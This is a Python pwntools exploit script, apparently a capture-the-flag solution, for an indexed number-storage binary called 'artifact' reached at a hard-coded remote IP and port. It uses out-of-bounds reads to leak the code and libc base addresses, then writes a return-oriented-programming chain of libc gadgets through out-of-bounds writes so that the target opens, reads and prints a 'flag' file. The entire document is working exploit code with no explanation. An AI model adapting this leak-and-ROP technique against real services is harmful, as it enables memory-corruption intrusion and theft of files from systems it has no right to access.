from pwn import *

# init
os.environ['LD_PRELOAD'] = './libc.so.6'
r = process('./artifact')
r = remote('52.192.178.153', 31337)
#r = remote('127.0.0.1', 8333)
e = ELF('./artifact')
libc = ELF('./libc.so.6')
context.arch = 'amd64'

# config
end_offset = 0x0000000000000796
buf = 203

def set(index, num):
    r.sendlineafter('Choice?\n', '2')
    r.sendlineafter('Idx?\n', str(index))
    r.sendlineafter('Give me your number:\n', str(num))
def show(index):
    r.sendlineafter('Choice?\n', '1')
    r.sendlineafter('Idx?\n', str(index))
    r.recvuntil('Here it is: ')
    num = unsigned(int(r.recvuntil('\n')[:-1]))
    return num
def unsigned(num):
    return (num & 0xffffffffffffffffffffffffffffffff)
def exploit(rop):
    for i in range(len(rop)):
        set(buf+i, rop[i])

    
# leak code base and libc
num = show(202)
code_base = num - 0xbb0
log.info('code_base: %#x' % code_base)
num = show(203)
libc_base = num - 0x203f1
num = show(200)
flag = num - 0x340 + 0x258 -8
set(200, u64('flag'+'\x00'*4))
log.info('libc_base: %#x' % libc_base)

# gadgets
#end = end_offset + code_base
prax = libc.search(asm('pop rax; ret')).next() + libc_base
prdi = libc.search(asm('pop rdi; ret')).next() + libc_base
prsi = libc.search(asm('pop rsi; ret')).next() + libc_base
prdx = libc.search(asm('pop rdx; ret')).next() + libc_base
syscall = libc.search(asm('syscall')).next() + libc_base
sh = libc.search('/bin/sh\x00').next() + libc_base
puts = libc.symbols['puts'] + libc_base
read = libc.symbols['read'] + libc_base
write = libc.symbols['write'] + libc_base
c_open = libc.symbols['open'] + libc_base
signal = libc.symbols['signal'] + libc_base
rop = []

# open("flag", 0, 2)
rop += [prdi, flag]
rop += [prsi, 0]
rop += [prdx, 2]
rop += [c_open]

# read(3, flag, 50)
rop += [prdi, 3]
rop += [prsi, flag]
rop += [prdx, 50]
rop += [read]

# puts(flag)
rop += [prdi, 1]
rop += [prsi, flag]
rop += [prdx, 50]
rop += [write]

rop += [libc.symbols['exit']+libc_base]
exploit(rop)
r.sendlineafter('Choice?\n', '3')
r.interactive()
